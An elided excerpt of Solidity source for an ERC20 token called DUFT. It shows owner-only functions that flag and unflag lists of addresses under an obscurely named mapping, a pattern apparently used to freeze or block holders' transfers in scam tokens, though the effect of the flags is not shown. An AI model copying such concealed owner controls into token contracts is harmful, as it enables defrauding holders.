...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function setDUFT(address [] calldata _addresses_) external onlyOwner {
    ...
    function unsetDUFT(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _transfersSnapshot[_addresses_[i]] = false;
        }
    }

    function isDUFT(address _address_) public view returns (bool) {
...
contract DUFT is ERC20 {
    constructor() ERC20("DUFT", "DUFT") {
